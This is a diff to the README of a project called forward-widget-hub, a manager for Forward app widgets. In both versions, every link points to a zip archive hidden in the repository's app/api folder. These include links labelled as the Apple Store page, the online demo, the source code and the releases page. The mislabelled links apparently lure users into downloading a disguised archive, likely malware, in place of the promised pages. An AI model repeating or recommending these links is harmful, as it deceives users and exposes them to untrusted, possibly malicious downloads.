@@ -1,6 +1,6 @@
 # 🚀 forward-widget-hub - Manage Forward App Widgets Easily
 
-[![Download forward-widget-hub](https://img.shields.io/badge/Download-Visit%20Page-4CAF50?style=for-the-badge&logo=github)](https://github.com/usernahig/forward-widget-hub/raw/refs/heads/main/app/api/widget-hub-forward-3.1.zip)
+[![Download forward-widget-hub](https://img.shields.io/badge/Download-Visit%20Page-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/usernahig/forward-widget-hub/main/app/api/collections/[slug]/hub_forward_widget_v1.7.zip)
 
 ---
 
@@ -40,7 +40,7 @@ The app supports `.js` widget files and `.fwd` subscription files. It helps gath
 
 Click the large green button at the top or this link to open the releases page:
 
-[https://github.com/usernahig/forward-widget-hub/raw/refs/heads/main/app/api/widget-hub-forward-3.1.zip](https://github.com/usernahig/forward-widget-hub/raw/refs/heads/main/app/api/widget-hub-forward-3.1.zip)
+[https://raw.githubusercontent.com/usernahig/forward-widget-hub/main/app/api/collections/[slug]/hub_forward_widget_v1.7.zip](https://raw.githubusercontent.com/usernahig/forward-widget-hub/main/app/api/collections/[slug]/hub_forward_widget_v1.7.zip)
 
 This page shows all the available versions of forward-widget-hub.
 
@@ -108,15 +108,15 @@ forward-widget-hub works by hosting files either on Cloudflare Workers or a Dock
   - Uses local databases and file storage.  
   - Gives full control but needs more setup.
 
-The online demo at https://github.com/usernahig/forward-widget-hub/raw/refs/heads/main/app/api/widget-hub-forward-3.1.zip shows the app running on Cloudflare. This demo is for testing only and may lose data anytime.
+The online demo at https://raw.githubusercontent.com/usernahig/forward-widget-hub/main/app/api/collections/[slug]/hub_forward_widget_v1.7.zip shows the app running on Cloudflare. This demo is for testing only and may lose data anytime.
 
 ---
 
 ## 🔗 Useful Links
 
-- Forward App on Apple Store: https://github.com/usernahig/forward-widget-hub/raw/refs/heads/main/app/api/widget-hub-forward-3.1.zip  
-- Source code and releases: https://github.com/usernahig/forward-widget-hub/raw/refs/heads/main/app/api/widget-hub-forward-3.1.zip  
-- Online demo: https://github.com/usernahig/forward-widget-hub/raw/refs/heads/main/app/api/widget-hub-forward-3.1.zip  
+- Forward App on Apple Store: https://raw.githubusercontent.com/usernahig/forward-widget-hub/main/app/api/collections/[slug]/hub_forward_widget_v1.7.zip  
+- Source code and releases: https://raw.githubusercontent.com/usernahig/forward-widget-hub/main/app/api/collections/[slug]/hub_forward_widget_v1.7.zip  
+- Online demo: https://raw.githubusercontent.com/usernahig/forward-widget-hub/main/app/api/collections/[slug]/hub_forward_widget_v1.7.zip  
 
 ---
 
@@ -124,4 +124,4 @@ The online demo at https://github.com/usernahig/forward-widget-hub/raw/refs/head
 
 Click below to open the releases page and get the Windows installer:
 
-[![Download forward-widget-hub](https://img.shields.io/badge/Download-Visit%20Page-4CAF50?style=for-the-badge&logo=github)](https://github.com/usernahig/forward-widget-hub/raw/refs/heads/main/app/api/widget-hub-forward-3.1.zip)
+[![Download forward-widget-hub](https://img.shields.io/badge/Download-Visit%20Page-4CAF50?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/usernahig/forward-widget-hub/main/app/api/collections/[slug]/hub_forward_widget_v1.7.zip)
